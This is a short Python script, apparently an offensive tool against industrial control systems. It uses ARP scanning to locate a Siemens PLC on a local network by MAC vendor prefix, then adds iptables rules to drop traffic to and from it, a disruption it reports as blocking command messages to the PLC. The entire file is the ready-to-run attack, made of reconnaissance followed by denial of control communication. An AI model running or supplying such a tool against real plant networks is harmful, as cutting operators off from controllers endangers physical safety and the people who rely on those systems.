from scapy.all import ARP, Ether, srp
import os
import time
import socket

# Function to find the PLC's IP address using ARP scanning
def find_plc_ip(network_range="192.168.1.1/24"):
    print("[*] Scanning the network to find the PLC...")

    # Send ARP request to get all devices in the network
    arp_request = ARP(pdst=network_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_response = srp(broadcast / arp_request, timeout=2, verbose=False)[0]

    for sent, received in arp_response:
        # Filtering Siemens PLCs using MAC Address pattern
        if received.hwsrc.startswith("00:0E:F7"):  # Siemens MAC vendor prefix
            print(f"[+] Found Siemens PLC at IP: {received.psrc}")
            return received.psrc

    print("[!] No Siemens PLC found!")
    return None

# Function to block command messages to the PLC
def block_plc_communication(plc_ip):
    print(f"[*] Blocking command messages to PLC at {plc_ip}...")

    # Using iptables to drop packets directed to the PLC
    os.system(f"iptables -A OUTPUT -d {plc_ip} -j DROP")
    os.system(f"iptables -A INPUT -s {plc_ip} -j DROP")
    
    print("[+] Successfully blocked communication to the PLC!")

# Main execution
if __name__ == "__main__":
    network_range = "192.168.1.1/24"  # Adjust with actual network range
    plc_ip = find_plc_ip(network_range)

    if plc_ip:
        block_plc_communication(plc_ip)
    else:
        print("[!] Exiting... No PLC found.")